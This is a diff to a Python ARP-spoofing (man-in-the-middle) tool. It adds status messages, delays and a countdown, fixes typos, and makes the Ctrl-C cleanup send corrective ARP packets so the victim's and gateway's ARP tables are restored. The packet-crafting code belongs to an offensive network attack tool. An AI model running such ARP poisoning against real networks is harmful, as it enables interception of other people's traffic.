@@ -25,6 +25,7 @@ class Spoofing_arp:
            subprocess.call(command,shell=True,stderr=subprocess.PIPE)  
            command = "arp -n"
            subprocess.call(command,shell=True,stderr=subprocess.PIPE)  
+           time.sleep(2)
       def get_geteway(self):
 
            with open ('/proc/net/arp','r') as geteway :
@@ -87,6 +88,12 @@ class Spoofing_arp:
               Packet_target = eth_hdr +arp_target 
               Packet_router = eth_hdr2 +arp_router
               time.sleep(1)
+              print("\n[*] arp_attack Start...."+"\n"+"*"*20)
+              print("[*] arp table has be delete successful")
+              time.sleep(2)
+              print("[*] New arp table has be created successful")
+              time.sleep(1)
+              print("[*] IP Forward set to  value 1")
               print('\n'+"*"*22)
               print("[*] Attck Status\n"+'*'*22)
               time.sleep(0.30)
@@ -101,6 +108,8 @@ class Spoofing_arp:
               print("[*] Geteway-Ip    -----------------|-> " + self.getaddrss)
               time.sleep(0.30)
               print("[*] Geteway-Mac   -----------------|-> " + self.getmac )
+              time.sleep(0.30)
+              print("[*] Interface     -----------------|-> " + self.args.Interface )
               print("*"*40+'\n')
               count = 1 
               print ("[*] Packet Send number >> ",count)
@@ -127,17 +136,29 @@ class Spoofing_arp:
               exit()
           except KeyboardInterrupt :
                     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+                    eth_hdr_Fix   = struct.pack("!6s6sH",dest_mac,self.geteway_mac,protocol)
+                    eth_hdr2_Fix    = struct.pack("!6s6sH",self.geteway_mac,dest_mac,protocol)
                     arp_target = struct.pack("!HHBBH6s4s6s4s",htype,ptype,hlen,plen,opcode_2,dest_mac,des_ip,self.geteway_mac,self.RouterIpConvert)
                     arp_router = struct.pack("!HHBBH6s4s6s4s",htype,ptype,hlen,plen,opcode_2,self.geteway_mac,self.RouterIpConvert,dest_mac,des_ip)
-                    Packet_target = eth_hdr +arp_target 
-                    Packet_router = eth_hdr2 +arp_router
+                    Packet_target = eth_hdr_Fix +arp_target 
+                    Packet_router = eth_hdr2_Fix +arp_router
+                    send_packet_to_Target   = SocketConnect.send(Packet_target)    
+                    send_packet_to_router   = SocketConnect.send(Packet_router) 
                     print("\rHosueKeeping Cleanup Process ......")
                     print("*"*40)
-                    print("[*] IP Forward set to dufouat value 0")
+                    print("[*] IP Forward set to default value 0")
                     time.sleep(1)
-                    print("[*] arp Taple set to Nourmal...")
+                    print("[*] arp Table set to Normal ...")
                     time.sleep(1)
-                    print("[*] safy exit ...")
+                    counted = 6 
+                    for i in range(int(counted)) :
+                        counted -=1
+                        print("[*] Exit attack Start DownCount >> "+str(counted))
+                        time.sleep(1)
+                        sys.stdout.write('\x1b[1A')
+                        sys.stdout.write('\x1b[2K')
+                    print("[*] Exit safe......")
+                    time.sleep(1)
                     exit()
       def arg_parse(self):
           parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")          
